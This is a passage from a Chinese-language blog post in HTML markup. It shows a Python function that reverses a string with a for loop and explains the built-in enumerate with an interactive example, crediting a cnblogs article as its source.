+<h3 id="6-for循环"><a href="#6-for循环" class="headerlink" title="6. for循环"></a>6. for循环</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">func</span><span class="params">(s)</span>:</span></span><br><span class="line">	ans = <span class="string">''</span></span><br><span class="line">	max_index = len(s) - <span class="number">1</span></span><br><span class="line">	<span class="keyword">for</span> index, value <span class="keyword">in</span> enumerate(s):</span><br><span class="line">		ans += s[max_index-index]</span><br><span class="line">	<span class="keyword">return</span> ans</span><br><span class="line"></span><br><span class="line">s = <span class="string">'abcdefg'</span></span><br><span class="line">print(func(s))</span><br></pre></td></tr></table></figure>
+<p>简单学习一下<code>enumerate</code>，它是python中的内置函数，适用于python2.x和python3.x<br><code>enumerate</code>在字典里是枚举、列举的意思<br><code>enumerate</code>参数为可遍历/可迭代的对象（如列表、字符串等）<br>例如：</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>l = [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="keyword">for</span> index, value <span class="keyword">in</span> enumerate(l):</span><br><span class="line"><span class="meta">... </span>    print(<span class="string">'%s, %s'</span> % (index, value))</span><br><span class="line">...</span><br><span class="line"><span class="number">0</span>, <span class="number">1</span></span><br><span class="line"><span class="number">1</span>, <span class="number">2</span></span><br><span class="line"><span class="number">2</span>, <span class="number">3</span></span><br><span class="line"><span class="number">3</span>, <span class="number">4</span></span><br><span class="line"><span class="number">4</span>, <span class="number">5</span></span><br><span class="line"><span class="number">5</span>, <span class="number">6</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure>
+<hr>
+<p>转自<a href="https://www.cnblogs.com/taceywong/p/8045127.html" target="_blank" rel="noopener">https://www.cnblogs.com/taceywong/p/8045127.html</a></p>
 ]]></content>
       <categories>
         <category>Daily Essays</category>
